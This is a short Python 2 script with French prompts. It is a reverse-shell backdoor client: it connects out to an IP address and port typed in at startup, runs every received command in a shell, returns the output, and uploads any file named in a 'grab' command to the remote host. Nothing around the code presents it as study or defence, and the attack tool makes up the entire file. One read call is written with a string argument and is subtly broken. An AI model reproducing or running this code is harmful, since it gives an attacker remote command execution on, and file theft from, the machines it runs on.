# coding: utf-8
import socket
import subprocess
import os



def transfer(connexion, path):
    if os.path.exists(path):
        f=open(path,'rb')
        packet = f.read(1024)

        while packet != '':
            connexion.send(packet)
            packet=f.read('1024')
        connexion.send('DONE')
        f.close()
    else:
        print(' Error le fichier n existe pas')









def connect(adresseip, port):
    connexionSocket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connexionSocket.connect((adresseip, port))

    while True:

        command = connexionSocket.recv(1024)

        if 'terminate' in command :
            connexionSocket.close()
            break
        elif 'grab' in command:

            grab, path = command.split('*')

            try:
                transfer(connexionSocket, path)
            except Exception as e:
                connexionSocket.send(str(e))  # send the exception error
                pass

        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            connexionSocket.send(CMD.stdout.read())  # send back the result
            connexionSocket.send(CMD.stderr.read())  # send back the error -if any-, such as syntax error

def main():
    adresseip = raw_input('Adresse IP : ')
    #adresseip = str(adresseip)
    port = input('Numéro de port du serveur')
    port=int(port)
    connect(adresseip, port)

main()


